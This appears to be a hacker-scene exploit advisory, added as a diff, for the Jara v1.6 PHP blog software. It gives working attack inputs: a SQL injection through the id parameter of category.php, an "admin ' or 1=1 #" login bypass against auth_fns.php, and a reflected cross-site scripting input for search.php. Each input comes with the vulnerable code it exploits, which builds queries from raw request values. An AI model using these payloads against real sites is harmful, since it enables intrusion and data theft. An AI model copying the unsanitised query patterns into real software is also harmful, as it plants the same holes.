@@ -1,0 +1,36 @@
+#!/Mohammed/bin/YahYa
+# Jara v1.6 Multiple Vulnerabilities 
+# -------------------------------------------[+]
+# download : http://sourceforge.net/projects/jara/files/v1.6/jarav16.zip
+# AutHOr   : Or4nG.M4n
+# cOntAct  :  priv8te[at]hotmail.com
+# versiOn  : v1.6
+# Tested   : My Mind (:
+# -------------------------------------------[+]
+#
+[ Exploit ] Sql injection ~ ~
+|=> /category.php?id=999999.9'[Here]
+# Vulnerable code : category.php
+#		@$categoryid = $_REQUEST["id"]; <= [1]
+#		$category = jara_get_category($categoryid); <=[2]
+#		jara_page_start("Category: ".$category["title"]); <=[3]
+#		$query = "select * from jara_posts where categoryid = '$categoryid'"; <=[4]
+#		$result = jara_db_query($query); <=[5]
+#
+[ Exploit ] Auth Bypass ~
+|=> admin ' or 1=1 # 
+# Vulnerable code : auth_fns.php
+#	    function jara_user_authenticate($username, $password) { <=[1]
+#		$query = "select * from jara_users where username = '$username' and password = SHA1('$password') limit 1"; <=[2]
+#		$result = jara_db_query($query); <=[3]
+#
+[ Exploit ] Cross Site Scrpting ~
+|=> POST : <h1>DDD<h1> => your xss Code
+# Vulnerable code : search.php
+#			$num_rows = $result->num_rows;
+#			echo "<p><strong>$num_rows</strong> results for <strong>".stripslashes($term)."</strong>.</p>";
+# ~ End
+# -------------------------------------------[+]
+#  Greet : sA^Dev!L , xSs m4n , Tryag Team 
+# Cyb3r-Crystal , Dr.Banned [Miss u] , i-hmx
+# -------------------------------------------[+]
